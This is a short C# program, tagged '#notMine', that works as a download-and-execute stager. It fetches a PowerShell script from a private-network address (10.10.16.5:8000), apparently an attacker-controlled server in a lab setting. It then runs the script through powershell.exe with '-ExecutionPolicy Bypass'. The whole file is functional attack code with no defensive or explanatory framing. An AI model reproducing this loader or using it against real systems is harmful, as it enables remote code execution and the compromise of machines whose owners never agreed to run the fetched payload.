#notMine
using System;
using System.Net.Http;
using System.Diagnostics;
using System.Threading.Tasks;

class Program
{
    static async Task Main()
    {
        string scriptUrl = "http://10.10.16.5:8000/oui.ps1"; 

        try
        {
            // Download the PowerShell script
            string scriptContent;
            using (var client = new HttpClient())
            {
                var response = await client.GetAsync(scriptUrl);
                response.EnsureSuccessStatusCode();
                scriptContent = await response.Content.ReadAsStringAsync();
            }

            // Execute the PowerShell script from memory
            ProcessStartInfo startInfo = new ProcessStartInfo()
            {
                FileName = "powershell.exe",
                Arguments = $"-NoProfile -ExecutionPolicy Bypass -Command \"{scriptContent}\"",
                UseShellExecute = false
            };

            Process process = new Process() { StartInfo = startInfo };
            process.Start();
            process.WaitForExit();
        }
        catch (Exception ex)
        {
            Console.WriteLine("An error occurred: " + ex.Message);
        }
    }
}
